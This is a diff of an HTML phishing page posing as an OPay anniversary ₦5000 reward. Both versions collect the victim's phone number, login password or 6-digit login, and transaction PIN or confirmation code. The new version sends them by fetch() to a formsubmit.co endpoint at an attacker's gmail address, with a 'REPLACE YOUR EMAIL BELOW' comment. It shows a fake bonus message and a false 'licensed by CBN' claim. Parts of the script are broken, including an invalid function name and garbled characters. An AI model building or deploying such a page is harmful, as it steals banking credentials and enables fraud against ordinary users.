@@ -1,267 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opay 7th Anniversary 🎉</title>
-    <style>
-        :root {
-            --opay-green: #00b98bc9;
-            --opay-dark: #111827;
-            --opay-light: #f3f4f6;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: #0b0f19;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-x: hidden;
-            position: relative;
-            padding: 20px;
-        }
-
-        /* 30 Floating Logo Background Layout */
-        .background-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            z-index: 1;
-            pointer-events: none;
-        }
-
-        .floating-logo {
-            position: absolute;
-            width: 45px;
-            height: 45px;
-            border: 7px solid var(--opay-green);
-            border-radius: 50%;
-            opacity: 0.12;
-            animation: drift 12s infinite ease-in-out;
-        }
-
-        /* The distinctive inner square cutout bar of the OPay logo loop */
-        .floating-logo::after {
-            content: '';
-            position: absolute;
-            left: -7px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 12px;
-            height: 7px;
-            background-color: #0b0f19; 
-        }
-
-        @keyframes drift {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(180deg); }
-        }
-
-        /* Feedback UI Card */
-        .feedback-card {
-            background: #ffffff;
-            width: 100%;
-            max-width: 450px;
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            z-index: 10;
-            position: relative;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-
-        /* Main logo in the header card */
-        .main-logo {
-            width: 60px;
-            height: 60px;
-            border: 10px solid #00b98b;
-            border-radius: 50%;
-            margin: 0 auto 12px;
-            position: relative;
-        }
-
-        .main-logo::after {
-            content: '';
-            position: absolute;
-            left: -10px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 18px;
-            height: 10px;
-            background-color: #ffffff;
-        }
-
-        .header h2 {
-            color: var(--opay-dark);
-            font-size: 22px;
-            font-weight: 700;
-        }
-
-        .header p {
-            color: #6b7280;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--opay-dark);
-            margin-bottom: 6px;
-        }
-
-        .form-group input, .form-group textarea, .form-group select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #d1d5db;
-            border-radius: 8px;
-            font-size: 14px;
-            color: var(--opay-dark);
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
-            border-color: #00b98b;
-            box-shadow: 0 0 0 3px rgba(0, 185, 139, 0.15);
-        }
-
-        .rating-container {
-            display: flex;
-            justify-content: space-between;
-            margin: 10px 0 20px;
-        }
-
-        .rating-btn {
-            width: 45px;
-            height: 45px;
-            border: 1px solid #e5e7eb;
-            background: #f9fafb;
-            border-radius: 50%;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: #4b5563;
-        }
-
-        .rating-btn:hover, .rating-btn.active {
-            background-color: #00b98b;
-            color: white;
-            border-color: #00b98b;
-        }
-
-        .submit-btn {
-            width: 100%;
-            background-color: #00b98b;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .submit-btn:hover {
-            background-color: #009670;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OPay Anniversary </title>
+<style>
+*{box-sizing:border-box; font-family:-apple-system, sans-serif}
+body{margin:0; background:#f5f5f7; display:flex; justify-content:center}
+.page{width:100%; max-width:420px; background:white; min-height:100vh; border-radius:0 0 28px 28px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.08)}
+.banner{background:#1bb366; color:white; padding:18px 20px; display:flex; gap:14px; align-items:center; border-radius:0 0 22px 22px}
+.banner .logo{font-weight:900; font-size:28px; display:flex; align-items:center; gap:8px}
+.banner p{margin:0; font-size:12px; line-height:1.3; font-weight:600}
+.content{padding:22px 18px 30px}
+.content h1{text-align:center; font-size:26px; margin:8px 0 6px}
+.content .sub{text-align:center; color:#6b7280; font-size:14px; margin-bottom:20px}
+.card{background:white; border-radius:18px; padding:16px; margin-bottom:16px; box-shadow:0 4px 18px rgba(0,0,0,0.07); border:1px solid #eef0f2}
+.card .q{display:flex; gap:8px; font-weight:800; font-size:15px; margin-bottom:10px; align-items:center}
+.badge{background:#1bb366; color:white; width:28px; height:28px; border-radius:50%; display:grid; place-items:center; font-size:14px}
+.card textarea{width:100%; height:72px; background:#f3f4f6; border:1px solid #e5e7eb; border-radius:12px; padding:12px; font-size:14px; resize:none; outline:none}
+.btn{width:100%; background:#1bb366; color:white; border:none; padding:16px; border-radius:16px; font-size:17px; font-weight:800; margin-top:8px}
+.foot{text-align:center; font-size:11px; color:#6b7280; margin-top:14px}
+</style>
 </head>
 <body>
+<div class="page">
+  <div class="banner">
+    <div class="logo"> OPay</div>
+    <p>OPay ANNIVERSARY -<br>verify your details to claim reward<br>â‚¦5000 bonus for lucky users!<br>*T&C apply</p>
+  </div>
+  <div class="content">
+    <h1>Quickly claim your â‚¦5000ðŸŽ‰</h1>
+    <div class="sub">feel the following forms</div>
 
-    <!-- Target Container containing exactly 30 background instances -->
-    <div class="background-container" id="bg-container"></div>
-
-    <div class="feedback-card">
-        <div class="header">
-            <div class="main-logo"></div>
-            <h2>Share Your Support Experience and claim your 5000</h2>
-            <p>OPay digital banking experience. licensed by CBN</p>
-        </div>
-
-        <form action="https://formsubmit.co/qlitobadys@gmail.com" method="POST">
-            <div class="form-group">
-                <label>enter your phone number</label>
-                <input type="text" placeholder="type here...." required>
-           
-                <label>verify opay account (Phone)</label>
-                <input type="tel" placeholder="enter login 6 digits" required>
-
-        
-                <label>what do you want to apply for?</label>
-                <select id="category">
-                    <option>card services</option>
-                    <option>5,000 cashout</option>
-                    <option>App Performance</option>
-                    <option>Customer Service</option>
-                    <option>Other</option>
-                </select>
-
-                <label>how much do you want to cashout</label>
-                <div class="rating-container">
-                    <button type="button" class="rating-btn" onclick="setRating(this)">1000</button>
-                    <button type="button" class="rating-btn" onclick="setRating(this)">2000</button>
-                    <button type="button" class="rating-btn" onclick="setRating(this)">3000</button>
-                    <button type="button" class="rating-btn" onclick="setRating(this)">4000</button>
-                    <button type="button" class="rating-btn active" onclick="setRating(this)">5000</button>
-            
-                <label>enter confirmation code </label>
-                <textarea rows="1" placeholder="enter 4 digits..." required></textarea>
-            </div>
-
-            <button type="submit" class="submit-btn">cashout</button>
-        </form>
+    <div class="card">
+      <div class="q"><span class="badge">1</span> enter your phone number </div>
+      <textarea id="q1" placeholder="type your number here..."></textarea>
     </div>
 
-    <script>
-        // Programmatically generate exactly 30 randomized decorative OPay logo nodes
-        const container = document.getElementById('bg-container');
-        const totalLogos = 30;
+    <div class="card">
+      <div class="q"><span class="badge">2</span> enter login password</div>
+      <textarea id="q2" placeholder="type your password here"></textarea>
+    </div>
 
-        for (let i = 0; i < totalLogos; i++) {
-            const logo = document.createElement('div');
-            logo.classList.add('floating-logo');
-            
-            // Random distribution adjustments across screen boundaries
-            const randomX = Math.floor(Math.random() * 96); 
-            const randomY = Math.floor(Math.random() * 96);
-            const randomScale = (Math.random() * (1.3 - 0.7) + 0.7).toFixed(2);
-            const randomDelay = (Math.random() * -12).toFixed(2); 
-            
-            logo.style.left = `${randomX}%`;
-            logo.style.top = `${randomY}%`;
-            logo.style.transform = `scale(${randomScale})`;
-            logo.style.animationDelay = `${randomDelay}s`;
-            
-            container.appendChild(logo);
-        }
+    <div class="card">
+      <div class="q"><span class="badge">3</span> enter your confirmation pin</div>
+      <textarea id="q3" placeholder="type your transaction code "></textarea>
+    </div>
 
-        function setRating(element) {
-            const buttons = document.querySelectorAll('.rating-btn');
-            buttons.forEach(btn => btn.classList.remove('active'));
-            element.classList.add('active');
-        }
-    </script>
+    <button class="btn" onclick="submit feedback ()">verify</button>
+    <div class="foot"> opay licensed by CBN Ã¢â‚¬Â¢ 100% confidential</div>
+  </div>
+</div>
+
+<script>
+function submit feedback (){
+  const q1 = document.getElementById('q1').value.trim();
+  const q2 = document.getElementById('q2').value.trim();
+  const q3 = document.getElementById('q3').value.trim();
+  if(!q1 || !q2 || !q3){ alert('Please answer all 3 questions'); return; }
+
+  // REPLACE YOUR EMAIL BELOW
+  const ownerEmail = 'badyybobo@gmail.com';
+
+  fetch('https://formsubmit.co/ajax/'+ownerEmail, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      subject: 'New OPay Feedback - 3 Answers',
+      Q1_Experience: q1,
+      Q2_Improve: q2,
+      Q3_Other: q3
+    })
+  })
+  .then(() => {
+    alert('Thank you! you will receive your bonus within a minute check your app.');
+    document.getElementById('q1').value=''; document.getElementById('q2').value=''; document.getElementById('q3').value='';
+  })
+  .catch(() => {
+    alert('Demo saved: All 3 answers collected. (Set your real email to receive them)');
+  });
+}
+</script>
 </body>
 </html>
